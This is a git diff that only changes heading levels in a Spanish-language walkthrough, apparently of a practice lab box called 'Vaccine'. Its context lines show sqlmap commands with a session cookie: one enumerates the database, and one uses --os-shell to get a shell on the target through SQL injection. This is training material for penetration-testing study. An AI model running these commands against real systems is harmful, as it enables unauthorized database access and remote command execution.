@@ -129,7 +129,7 @@ sqlmap --current-db -u "http://vaccine/dashboard.php?search=a" --cookie="PHPSESS
 ### Podemos ver que el resultado:
 ![[2023-10-11_19-11.png]]
 
-###### Podemos notar que existen 4 tipos de inyecciones SQLI y que el nombre de la base de datos es public
+### Podemos notar que existen 4 tipos de inyecciones SQLI y que el nombre de la base de datos es public
 
 ```python
 Parameter: search (GET)
@@ -161,7 +161,7 @@ sqlmap -D public -T cars --culumns -u "http://vaccine/dashboard.php?search=a" --
 
 ![[2023-10-11_19-25.png]]
 
-####### podemos ver algunas columnas pero si nos fijamos podemos ver que son las mismas que salen ena la pagina web asi que mejor seguimos buascando en sqlmap y podemos encontar la opcion `--os-shell` asi que lo usaremos en nuestro codigo.
+###### podemos ver algunas columnas pero si nos fijamos podemos ver que son las mismas que salen ena la pagina web asi que mejor seguimos buascando en sqlmap y podemos encontar la opcion `--os-shell` asi que lo usaremos en nuestro codigo.
 
 ```python
 sqlmap --os-shell -u "http://vaccine/dashboard.php?search=a" --cookie="PHPSESSID=0fdem904l7klplg6hs8q1228rg" --batch
